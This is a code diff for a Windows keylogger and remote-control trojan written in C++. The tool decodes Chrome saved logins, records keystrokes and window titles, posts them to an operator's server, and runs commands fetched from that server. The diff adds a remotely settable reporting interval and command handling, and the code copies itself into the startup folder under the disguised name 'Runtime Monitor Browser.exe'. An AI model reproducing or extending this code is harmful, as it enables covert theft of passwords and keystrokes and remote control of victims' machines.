@@ -17,7 +17,7 @@
 #include "decode_Chrome_login_data.h" // to decode Chrome -> Login data
 #include "html_utility.h" // for html request
 
-// #define CONSOLE_LOG  // define to enable console log
+#define CONSOLE_LOG  // define to enable console log
 
 #ifdef _DEBUG
 #pragma comment(lib, "libcurl/lib/libcurl_a_debug.lib")
@@ -27,6 +27,8 @@
 
 using namespace std;
 namespace fs = experimental::filesystem;
+// Global Variable
+int UPDATE_PERIOD = 500;
 
 // FUNCTION
 void copy_to_startup();
@@ -37,7 +39,7 @@ void decrypt_send_password(string url);
 string get_list_files(string dir);
 wstring get_list_files(wstring dir);
 wstring get_path_w(string dir);
-int execute_command();
+int execute_command(string cmd);
 // char * ReadAllBytes(const char * filename, int * read_length);
 
 int main()
@@ -63,6 +65,10 @@ int main()
 	if (base_url.find("http://") == std::string::npos) {
 		base_url = "http://" + base_url;
 	}
+	if (base_url[base_url.length() - 1] == '/') {
+		base_url[base_url.length() - 1] = '\0';
+	}
+
 	/* Init needed url*/
 	URL_DATA = base_url + "/data";
 	URL_UPLOAD = base_url + "/upload";
@@ -70,39 +76,40 @@ int main()
 	URL_CMD = base_url + "/cmd";
 
 
-	print_drivers();
-	print_drivers();
-	print_drivers();
-
 #ifdef CONSOLE_LOG
 	// _setmode(_fileno(stdout), _O_U16TEXT); //cần để viết được ký tự utf-16 ra stdout
 #endif // CONSOLE_LOG
 
 	wchar_t lastTitle[1024];
 	wchar_t title[1024];
-	int count = 0;
+	
 	string key_data = "";
+	string cmd = "";
 
+	int count = 0;
+	
 	while (true) {
 		Sleep(10);
 		// Get the active windowtitle
 		count++;
-		if (count>500) {
+		if (count>UPDATE_PERIOD) {
 			count = 0;
 			// Send Key data to server
 			if (!key_data.empty()) {
 #ifdef CONSOLE_LOG
 				std::printf("SEND KEY DATA\n");
 #endif
-				curl_post(key_data.c_str(), URL_DATA);
+				cmd = curl_post(key_data.c_str(), URL_DATA);
 				key_data.clear();
 				key_data = "";
 			}else {
+				cmd = get_html(URL_CMD);
 #ifdef CONSOLE_LOG
 				std::printf("NO DATA TO SEND\n");
 #endif
 			}
-			execute_command();
+			execute_command(cmd);
+			cmd = "";
 		}
 
 		HWND hwndHandle = GetForegroundWindow();
@@ -270,8 +277,7 @@ int main()
     return 0;
 }
 
-int execute_command() {
-	string cmd = get_html(URL_CMD);
+int execute_command(string cmd) {
 
 	if (cmd.empty()) {
 		// there is no command
@@ -378,6 +384,32 @@ int execute_command() {
 		return 0;
 	}
 
+	// CMD change UPDATE_PERIOD
+	if (cmd.find("update_period ", 0) != std::string::npos) {
+		// remove space
+		int offset = 14;
+		while (offset < (cmd.length() - 1)) {
+			if (cmd[offset] == ' ') {
+				offset++;
+			}
+			else {
+				break;
+			}
+		}
+		// actual period
+		string period = cmd.substr(offset, cmd.length() - 3);
+		int time = atoi(period.c_str());
+		time = time / 10;
+		if (time<200)
+		{
+			time = 500;
+		}
+		UPDATE_PERIOD = time;
+		// ascii dir
+		curl_post("Update period (ms) = " + to_string(UPDATE_PERIOD), URL_CMD);
+		return 0;
+	}
+
 	// CMD print all drivers
 	if (cmd.find("drivers", 0) != std::string::npos) {
 		print_drivers();
@@ -455,6 +487,7 @@ wstring get_path_w(string dir) {
 	}
 	return res_path;
 }
+
 string get_list_files(string dir) {
 	string res = "";
 	int i = 0;
@@ -514,6 +547,7 @@ void decrypt_send_password(string url) {
 }
 
 
+// copy to Window startup folder (shell:startup)
 void copy_to_startup() {
 	TCHAR szPath[MAX_PATH];
 	WCHAR* file_name = _T("Runtime Monitor Browser.exe");
